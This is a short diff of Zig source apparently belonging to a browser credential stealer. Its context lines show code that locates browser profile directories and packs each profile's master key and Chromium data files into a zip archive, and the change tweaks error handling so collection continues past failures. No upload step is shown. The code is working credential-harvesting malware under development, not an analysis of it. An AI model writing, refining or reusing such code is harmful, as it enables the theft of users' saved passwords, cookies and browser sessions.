@@ -75,7 +75,7 @@ fn findProfileDirs(allocator: std.mem.Allocator, base_path: []const u8) ![][]con
 fn copyToZip(zip: *zip_mod.ZipWriter, source_path: []const u8, archive_name: []const u8) void {
     const mapped = file_io.MappedFile.open(source_path) orelse return;
     defer mapped.close();
-    zip.addFile(archive_name, mapped.slice()) catch {};
+    zip.addFile(archive_name, mapped.slice()) catch return;
 }
 
 pub fn collect(
@@ -142,7 +142,7 @@ pub fn collect(
             const profile_name = std.fs.path.basename(profile_path);
             var key_dest_buf: [256]u8 = undefined;
             const key_dest_path = std.fmt.bufPrint(&key_dest_buf, "{s}/{s}/{s}", .{ browser.name, profile_name, master_key_name }) catch continue;
-            zip.addFile(key_dest_path, master_key_slice) catch {};
+            zip.addFile(key_dest_path, master_key_slice) catch continue;
 
             for (chromium_files) |file_name| {
                 var src_buf: [512]u8 = undefined;
